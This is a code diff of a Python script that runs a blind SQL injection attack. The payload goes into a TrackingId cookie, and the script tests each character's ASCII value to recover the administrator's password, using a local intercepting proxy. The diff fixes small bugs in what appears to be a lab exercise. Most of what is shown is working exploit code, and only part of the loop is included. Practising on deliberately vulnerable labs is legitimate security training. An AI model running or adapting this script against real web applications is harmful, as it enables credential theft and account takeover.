@@ -3,7 +3,7 @@ import requests
 import urllib3
 import urllib
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
 
@@ -13,7 +13,7 @@ def sqli_password(url):
       for j in range (32,126):
          sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--'" % (i,j)
          sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-         cookie = {'TrackingId': 'x3ozfrWLxIWkAMKQ' + sqli_payload_encoded, 'session': 'Z1u7ID6INubrFTmVtDm8pn7ZjAWX4HIJ'}
+         cookies = {'TrackingId': 'IB0G3BhAMBmErGMz' + sqli_payload_encoded, 'session': 'ozeJoS6EzTCelOfHTmUMQWptOZsxeCKD'}
          r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
          if "Welcome" not in r.text:
             sys.stdout.write('\r' + password_extracted)
@@ -28,6 +28,7 @@ def main():
    if len(sys.argv) != 2:
       print("(+) Usage: %s <url>" % sys.argv[0])
       print("(+ )Example: %s http://target.com/vulnerable_endpoint" % sys.argv[0])
+      sys.exit(1)
 
    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
